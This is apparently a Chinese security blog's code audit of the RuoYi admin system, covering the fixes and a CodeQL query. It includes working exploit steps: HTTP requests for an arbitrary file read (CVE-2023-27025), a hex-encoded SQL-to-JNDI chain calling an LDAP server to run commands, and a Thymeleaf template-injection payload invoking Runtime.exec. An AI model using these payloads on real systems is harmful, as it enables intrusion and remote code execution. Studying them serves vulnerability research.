---
date: 2025-05-25
title: ruoyi
tags:
  - java安全
  - 代码审计
---
环境搭建和一些配置可以看官方文档 https://doc.ruoyi.vip/ruoyi/
ruoyi是一个后台管理系统，主要的功能实现方面还是在后台。我们先来看这个定时任务所引发的一系列问题。
https://doc.ruoyi.vip/ruoyi/document/htsc.html#定时任务
关于定时任务所对应的这个类所对应的要求。
```
1、后台添加定时任务处理类（支持`Bean`调用、`Class`类调用）  
`Bean`调用示例：需要添加对应`Bean`注解`@Component`或`@Service`。调用目标字符串：`ryTask.ryParams('ry')`  
`Class`类调用示例：添加类和方法指定包即可。调用目标字符串：`com.ruoyi.quartz.task.RyTask.ryParams('ry')`
```
# 4.7.8 
# 任意文件下载
CVE-2023-27025
先从这个开始说起，这个版本不是很新，但也不是特别的旧。
## 复现
首先创建一个新的定时任务。post内容大致如下
```
createBy=admin&
jobName=renwu&
jobGroup=DEFAULT&
invokeTarget=ruoYiConfig.setProfile('e://1.txt')&
cronExpression=0%2F15+*+*+*+*+%3F&
misfirePolicy=1&
concurrent=1&
status=0&
remark=
```
对应的内容。

![image-20250706233655309](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250706233655309.png)

然后run一下
```ini
POST /monitor/job/run HTTP/1.1
Host: 192.168.58.1:8081
Content-Length: 7
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.58.1:8081
Referer: http://192.168.58.1:8081/monitor/job
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=eb2560e2-37bd-4249-be85-46ff3289438a
Connection: keep-alive

jobId=4
```
然后就可以读文件了。
```ini
GET /common/download/resource?resource=1.txt HTTP/1.1
Host: 192.168.58.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.58.1:8081/monitor/job/edit/1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=eb2560e2-37bd-4249-be85-46ff3289438a
Connection: keep-alive
```
## 分析
咱们来看看漏洞最后一步所对应的代码。总的来说就是RuoYiConfig.getProfile(); 获取配置文件然后传输到前端。
src/main/java/com/ruoyi/web/controller/common/CommonController.java
```java
@GetMapping("/download/resource")  
public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)  
		throws Exception  
{  
	try  
	{  
		if (!FileUtils.checkAllowDownload(resource))  
		{  
			throw new Exception(StringUtils.format("资源文件({})非法，不允许下载。 ", resource));  
		}  
		// 本地资源路径  
		String localPath = RuoYiConfig.getProfile();  
		// 数据库资源地址  
		String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);  // 这行代码可以或略不记。
		// 下载名称  
		String downloadName = StringUtils.substringAfterLast(downloadPath, "/");  
		response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);  
		FileUtils.setAttachmentResponseHeader(response, downloadName);  
		FileUtils.writeBytes(downloadPath, response.getOutputStream());  
	}  
	catch (Exception e)  
	{  
		log.error("下载文件失败", e);  
	}  
}  
```
然后这个RuoYiConfig这个类 有Component注解。是可以利用的，还有对应的setProfile方法。我们可以通过定时任务修改RuoYiConfig.getProfile()的值。从何通过上述那个路由达到任意文件读取的目的。
```java
@Component  
@ConfigurationProperties(prefix = "ruoyi")  
public class RuoYiConfig  
{  
    /** 上传路径 */  
    private static String profile;  

    public static String getProfile()  
    {  
        return profile;  
    }  
  
    public void setProfile(String profile)  
    {  
        RuoYiConfig.profile = profile;  
    }  
}
```

# sql2RCE
思路就是通过GenTableServiceImpl.createTable来插入我们jndi注入的命令。然后再执行即可。
com/ruoyi/generator/service/impl/GenTableServiceImpl.java
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/Basic/Command/calc.exe')
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f42617369632f436f6d6d616e642f63616c632e6578652729
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f42617369632f436f6d6d616e642f63616c632e6578652729 WHERE job_id = 3;')
添加任务，然后记得编码一下。
genTableServiceImpl.createTable('UPDATE%20sys_job%20SET%20invoke_target%20%3D%200x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f42617369632f436f6d6d616e642f63616c632e6578652729%20WHERE%20job_id%20%3D%203%3B')
```
然后执行一下这定时任务就可以触发jndi注入的。

![image-20250706234953259](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250706234953259.png)

后来看了看，是在4.7.9这个版本加上去的。 com.ruoyi.generator 
然后白名单变成了这个 com.ruoyi.quartz.task    // 不是哥们这么逆天吗。然后这个地方就已经被完全堵死了。前面那些黑名单还有作用吗。

# 修复
src/main/java/com/ruoyi/quartz/controller/SysJobController.java
修复的话很容易想到，大概率是修复添加临时任务那个地方。但是没有修复之前其实这个地方就已经做了很多的过滤了。
```java
public AjaxResult addSave(@Validated SysJob job) throws SchedulerException, TaskException  
{  
    if (!CronUtils.isValid(job.getCronExpression()))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，Cron表达式不正确");  
    }  
    else if (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，目标字符串不允许'rmi'调用");  // 过滤 rmi:
    }  
    else if (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), new String[] { Constants.LOOKUP_LDAP, Constants.LOOKUP_LDAPS }))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，目标字符串不允许'ldap(s)'调用");  // 过滤ldap:
    }  
    else if (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), new String[] { Constants.HTTP, Constants.HTTPS }))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，目标字符串不允许'http(s)'调用");   // 过滤 http:
    }  
    else if (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), Constants.JOB_ERROR_STR))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，目标字符串存在违规");  // 下面那个图片里面的黑名单
    }  
    else if (!ScheduleUtils.whiteList(job.getInvokeTarget()))  
    {  
        return error("新增任务'" + job.getJobName() + "'失败，目标字符串不在白名单内");  // 再判断一下白名单。
    }  
    job.setCreateBy(getLoginName());  
    return toAjax(jobService.insertJob(job));  
}
```
4.7.9加上了这个黑名单com.ruoyi.generator 其实加一个黑名单可能存在可以利用的类还比较多，但是 白名单换成com.ruoyi.quartz.task 。就基本杀除了太多可能，定时任务这块基本很难产生安全问题了。

![image-20250706233941920](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250706233941920.png)

这样可以打印出所有的bin。
```java
ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
String[] beanDefinitionNames = run.getBeanDefinitionNames();
for (String beanDefinitionName : beanDefinitionNames) {
    System.out.println(beanDefinitionName);
}
```
codeql查一下。就完全没有可以利用的类了。然后其实它加了这样一个白名单，以com.ruoyi.quartz.task开始的包的类就几乎没有了。只有开始自带的两个案例。如果删掉.task也许还会有很多。
```java
import java

from Method m

where 
    m.getDeclaringType().getAConstructor().hasNoParameters()
    and m.isPublic()
    and m.getAParamType() instanceof TypeString
    and m.getDeclaringType().getPackage().getName().matches("com.ruoyi.quartz.task%")
    and not m.isAbstract()
    and not m.getDeclaringType().getPackage().getName().matches("com.ruoyi.common.config%")
    and not m.getDeclaringType().getPackage().getName().matches("com.ruoyi.common.utils.file%")
    and not m.getDeclaringType().getPackage().getName().matches("com.ruoyi.generator%")
    and not m.getName().matches("get%")
    and not m.getName().matches("is%")
    and not m.getName().matches("has%")

select m.getDeclaringType().getPackage().getName(),m.getDeclaringType(),m
```
# 其它
然后我看到了 https://xz.aliyun.com/news/10405   果不其然，ruoyi还是一个有故事的人。
其实如果都由shiro统一管理并且遵守规范的话，其实这一块应该不会出问题。可以利用的未授权api也比较难找。
# <=4.7.1
首先ruoyi也是有模板这种东西的。然后还有一个模板渲染的漏洞。
```
${T (java.lang.Runtime).getRuntime().exec("calc")}
http://192.168.58.1:8083/monitor/cache/getNames?fragment=%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D
```
模板注入。
这个问题其实可以算作是Thymeleaf。但是ruoyi的配置也有一些问题。
https://forum.butian.net/share/1922
然后在在一个issue里面看到了。这个依赖的差异pom里面其实都是看不到的。然后真的就是这个供应链的问题了。
https://gitee.com/y_project/RuoYi/issues/I7MOWG
https://github.com/thymeleaf/thymeleaf-spring/issues/256         3.0.15后这个漏洞被修复

![image-20250706235150653](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250706235150653.png)

